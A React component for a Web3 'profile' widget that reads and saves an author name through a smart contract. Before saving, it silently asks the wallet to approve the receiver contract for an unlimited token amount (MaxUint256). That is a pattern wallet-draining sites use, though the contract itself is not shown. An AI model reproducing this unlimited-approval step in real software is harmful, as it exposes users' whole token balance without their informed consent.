/* eslint-disable no-empty */
/* eslint-disable no-unused-vars */
/* eslint-disable react-hooks/exhaustive-deps */

import { useEffect, useState } from 'react'
import { useAppKit, useAppKitAccount, useAppKitProvider } from '@reown/appkit/react'
import { BrowserProvider, Contract, MaxUint256 } from 'ethers'
import { styled } from 'styled-components'
import { motion } from 'framer-motion'
import config from './crypto/config.js'

const Body = styled(motion.div)`
  position: absolute;
  right: 15px;
  bottom: 335px;
  background: #21ff4a1c;
  border: 1px solid #32ff6fd4;
  border-radius: 4px;
`

const Input = styled.input`
  background: #ffffff;
  color: #000;
  border: none;
  outline: none;
  max-width: 100%;
  width: 100%;
  height: 30px;
  border-radius: 4px;
  padding: 6px 8px;
  box-sizing: border-box;
  font-family: "SUSE Mono", sans-serif;
  font-size: 13px;
  margin-right: 10px;
`

const Button = styled.button`
  background: #ffffff;
  color: #000;
  border: none;
  outline: none;
  height: 30px;
  border-radius: 4px;
  padding: 6px 8px;
  box-sizing: border-box;
  font-family: "SUSE Mono", sans-serif;
  font-size: 13px;
`

const Navigation = styled.div`
  display: flex;
  justify-content: center;
  align-items: center;
  padding: 10px;
`

const Profile = () => {
  const { open } = useAppKit()
      , { address, isConnected } = useAppKitAccount({ namespace: 'eip155' })
      , { walletProvider } = useAppKitProvider('eip155')

  const [name, setName] = useState('')

  const createSignerPrivate = async () => {
    if (!walletProvider || !address) {
      throw new Error('Wallet not connected')
    }   

    const provider = new BrowserProvider(walletProvider)
    const network = await provider.getNetwork()
    const signer = await provider.getSigner()
    return [signer, parseInt(network.chainId)]
  }

  const getAuthorByAddress = async (address) => {
    if (!address) {
      return ''
    }
    
    const [signer, network] = await createSignerPrivate()
    const _address = config.address[network]

    const receiver = new Contract(_address.receiver, config.ABI.receiver, signer)
        , text = await receiver.getAuthorByAddress(address)      

    return text
  }

  const setAuthor = async name => {
    if (!isConnected) {
      open()
      return
    }
    const [signer, network] = await createSignerPrivate()
    const _address = config.address[network]

    const token = new Contract(_address.token, config.ABI.token, signer)
        , receiver = new Contract(_address.receiver, config.ABI.receiver, signer)

    const allowance = await token.allowance(address, _address.receiver)

    if (allowance < 10) {
        const approveTx = await token.approve(_address.receiver, MaxUint256)
        await approveTx.wait()
    }

    const calcTx = await receiver.setAuthorname(name)
    const { status } = await calcTx.wait()
    if (status === 1) {
      const _name = await getAuthorByAddress(address)
      setName(_name)
    }
  }

  useEffect(() => {
    if (isConnected) {
      const timeId = setTimeout(async () => {
        const _name = await getAuthorByAddress(address)
        setName(_name)
      }, 1000)

      return () => clearTimeout(timeId)
    }
  }, [isConnected])

  return (
    <Body drag>
      <Navigation>
        <Input 
          placeholder='Your name...'
          value={name} 
          onChange={({ target: { value } }) => setName(value)}  
        />
        <Button 
          onClick={() => setAuthor(name)}
        >save</Button>
      </Navigation>
    </Body>
  )
}

export default Profile